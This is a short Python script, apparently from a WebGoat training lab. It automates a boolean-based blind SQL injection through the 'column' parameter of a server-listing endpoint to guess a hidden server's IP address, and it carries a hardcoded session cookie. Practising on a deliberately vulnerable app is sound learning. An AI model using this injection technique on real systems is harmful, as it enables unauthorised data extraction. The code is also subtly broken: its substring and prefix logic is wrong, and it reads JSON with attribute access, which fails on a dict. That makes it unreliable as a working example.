import requests
import json

header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

cookies = {
    'JSESSIONID': '4C322D560CDACCD0285413BF07A536C9'
}

for p in range(10):
    print(p)

for i in range(3):
    for x in range(10):
        sql_q = "(CASE WHEN (SELECT ip FROM servers WHERE hostname='webgoat-prd' AND substring(ip,1,%s) = '%s')IS NOT NULL THEN hostname ELSE id END)" % (i, x)
        params = {
            'column': sql_q,
        }
        response = requests.get('http://jupyterhub.stud.hshl.net:8080/WebGoat/SqlInjection/servers', params=params,
                                headers=header, cookies=cookies)
        if response.status_code == 403:
            print('Der Server hasst mich')
        else:
            json_data = json.loads(response.text)
            if json_data[0].id == '3':
                print(x)
                break
            else:
                print('Not quite right: %s' % x)
